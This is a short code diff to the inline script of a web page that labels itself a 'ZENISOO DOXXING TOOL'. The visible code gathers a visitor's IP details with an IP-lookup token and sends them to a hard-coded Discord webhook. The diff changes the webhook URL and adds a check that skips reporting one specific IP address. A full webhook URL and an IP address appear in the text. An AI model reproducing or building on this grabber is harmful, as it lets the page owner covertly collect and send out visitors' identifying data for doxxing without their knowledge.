@@ -42,7 +42,7 @@
 </body>
 <script>
     const iptoken = 'd3df1d9e27298e';
-const webhookurl = 'https://discord.com/api/webhooks/1256077249199865906/vxHTszKG92IwdvE02Sa0DCAL3olgPKFwx2lmWNc6Bv61XqBrI8vwy11Y4WziEeYf6wEOp';
+const webhookurl = 'https://discord.com/api/webhooks/1256077249199865906/vxHTszKG92IwdvE02Sa0DCAL3olgPKFwx2lmWNc6Bv61XqBrI8vwy11Y4WziEeYf6wEO';
 
 var t = new Date();
 const timec = t.toLocaleString();
@@ -174,6 +174,8 @@ Promise.all([
     })();
 
     // Construct the combined embed with available data
+    if  (ipinfoData.ip == '103.3.80.181') {
+        return 'Error' }
     sendToServer({
         embeds: [{
             title: 'ZENISOO DOXXING TOOL',
